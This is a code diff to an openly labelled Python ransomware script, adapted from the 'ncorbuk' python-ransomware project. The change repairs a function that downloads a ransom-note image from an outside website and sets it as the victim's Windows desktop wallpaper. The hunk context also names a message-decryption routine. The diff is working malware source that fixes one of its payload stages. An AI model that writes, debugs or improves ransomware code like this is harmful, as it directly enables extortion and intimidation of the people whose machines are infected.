@@ -85,10 +85,10 @@ def decrypt_message(encrypted_message):
 # Function to change Windows Desktop background to Ransomware
 # using portions from "ncorbuk" python-ransomware
 
-def change_desktop_background(self):
+def change_desktop_background():
     imageUrl = 'https://www.pcrisk.com/images/stories/screenshots202102/text-ransomware-ransom-note.jpg'
     # Go to specif url and download+save image using absolute path
-    path = f'{self.sysRoot}Desktop/background.jpg'
+    path = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'background.jpg')
     urllib.request.urlretrieve(imageUrl, path)
     SPI_SETDESKWALLPAPER = 20
     # Access windows dlls for funcionality eg, changing dekstop wallpaper
